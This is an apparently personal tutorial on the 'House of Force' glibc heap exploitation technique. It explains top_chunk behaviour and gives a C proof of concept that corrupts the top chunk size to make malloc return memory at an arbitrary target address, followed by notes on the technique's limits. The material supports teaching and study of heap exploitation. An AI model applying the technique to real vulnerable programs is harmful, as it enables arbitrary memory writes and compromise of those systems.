# House of Force
> LongChampion, 18/03/2020

Finally, I have found an attack that can "break" the top_chunk.

## What is top_chunk?
When your program call first *malloc function*, some kernel function (such as `brk` and `sbrk`) is called to change the `program_break` and give your program a heap segment. In most case, the initial heap segment is much larger than your request size. Because your allocated chunk only mamages the memory belong to it, top_chunk is created to manage the remaining memory of heap segment.  
For example, if you call `malloc(0x100)` and the program heap segment is [0x603000 - 0x624000], then the memory layout will be:
```
    + - - - - - - - - - + - - - - - - - - - - - - - - - - - - - - - - - - - - +
    |    your chunk     |                      top_chunk                      |
    |    size: 0x110    |                    size: 0x20ef0                    |
    + - - - - - - - - - + - - - - - - - - - - - - - - - - - - - - - - - - - - +
    ^                   ^                                                     ^
    |                   |                                                     |
0x603000            0x603110                                              0x624000
```
This is very easy to understand, isn't it? Please remember that although your request size is 0x100, the size of returned chunk is actually 0x110 because of padding and chunk header.  
The top_chunk mechanism is very simple: when you allocate a new (small enoungh) chunk, top_chunk is split into two chunks, ones is returned to you and the remainning becomes the new top_chunk.
```
    + - - - - - - + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
    | your chunk  |                         top_chunk                         |
    + - - - - - - + - - - - - + - - - - - - - - - - - - - - - - - - - - - - - +
    | your chunk  | new chunk |                 new top_chunk                 |
    + - - - - - - + - - - - - + - - - - - - - - - - - - - - - - - - - - - - - +

```

## The attack
```
#include <stdlib.h>

struct Chunk
{
    long long pre_size, size;
    struct Chunk *fd, *bk;
};

char SECRET[] = "This is the top secret!";

int main()
{
    void *first = malloc(0x100 - 8);

    struct Chunk *top_chunk = (struct Chunk *) (first + 0x100 - 0x10);
    top_chunk->size = -1;

    long long padding_size = (long long) &SECRET - 0x10 - (long long) top_chunk;
    void *padding = malloc(padding_size - 8);
    void *REWARD = malloc(0x100 - 8);
}
```
First, we need call `malloc` once to create top_chunk. Then, we overwrite top_chunk's size to a very big value (I use -1). Next, we calculate `padding_size`: the distance between top_chunk and our target chunk. Finally, we call `malloc(padding_size)` to move our top_chunk to target chunk and call `malloc` one more time to complete the attack.

### Note
- "-1 is a very big value?". If you know how computer store integer in memory and chunk size is always consider as unsigned, you will recognize that is really TRUE.
- Our target can be any memory address, but be careful if your target is on the stack or in the segment that don't have write permission. Try to attack on those can crash your program because `malloc` will modify some pointer of top_chunk when moving it and smash your stack frame or violate segment's permission.
- The target chunk is begin at offset 0x10 before target address (this is the reason why we need operand `-0x10` when calculate `padding_size`)
- In some case, the attack can't be perform because `padding_size` is not a valid chunk size (does not divide by 0x10 in x64 system or 0x8 in x86 system)
